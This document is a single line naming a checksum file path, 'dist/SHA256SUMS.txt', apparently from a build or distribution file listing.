            dist/SHA256SUMS.txt
